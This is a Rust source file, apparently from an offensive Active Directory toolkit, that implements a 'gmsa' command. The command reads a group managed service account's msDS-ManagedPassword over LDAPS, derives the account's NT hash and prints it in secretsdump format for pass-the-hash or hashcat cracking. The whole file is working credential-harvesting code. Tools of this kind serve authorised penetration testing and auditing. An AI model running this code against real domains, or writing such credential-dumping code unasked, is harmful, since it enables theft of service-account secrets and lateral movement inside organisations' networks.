//! gMSA managed-password read: LDAPS-sealed msDS-ManagedPassword →
//! MD4 → NT hash suitable for PtH/hashcat.

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct GmsaArgs {
    /// LDAP URL (LDAPS required — the managed password is only returned over a sealed channel)
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long, default_value = "")]
    pub password: String,
    #[arg(long)]
    pub insecure: bool,
    /// gMSA sAMAccountName (e.g. gmsa_web$)
    #[arg(long)]
    pub target: String,
}

/// Read a gMSA's managed password over LDAP and derive its NT hash. The managed password is a
/// constructed attribute the DC returns only over a sealed channel (LDAPS here) to principals in
/// `msDS-GroupMSAMembership`. Output is PtH/hashcat-usable.
pub(crate) async fn gmsa(mut a: GmsaArgs) -> Result<()> {
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    use adhammer_collector::{Collector, LdapConfig};
    // msDS-ManagedPassword is a "confidential" attribute — AD returns it *only* over an
    // encrypted channel (LDAPS or sealed SASL). Fail fast with a clear message rather than
    // let ldap3 surface a raw `UNABLE_TO_PROCEED` from the server.
    if a.url.starts_with("ldap://") {
        anyhow::bail!(
            "gMSA managed-password read needs an encrypted channel — use `ldaps://` \
             (add --insecure for self-signed). Plain ldap:// will return \
             UNABLE_TO_PROCEED even for an authorized reader."
        );
    }
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let blob = c
        .read_attr_bin(&a.target, "msDS-ManagedPassword")
        .await
        .with_context(|| {
            format!(
                "read msDS-ManagedPassword on '{}' — is it a gMSA? is the bind identity in \
                 PrincipalsAllowedToRetrieveManagedPassword?",
                a.target
            )
        })?
        .with_context(|| {
            format!(
                "'{}' returned no msDS-ManagedPassword (not a gMSA, or the bind identity \
                 isn't allowed to retrieve it)",
                a.target
            )
        })?;
    let pw =
        crate::parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
    let nt = ntlmssp::md4(&pw);
    let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
    // secretsdump-style line; the RID is unknown here, so print sam + hash.
    println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
    eprintln!(
        "[+] gMSA {} current-password NT hash recovered ({} blob bytes)",
        a.target,
        blob.len()
    );
    Ok(())
}
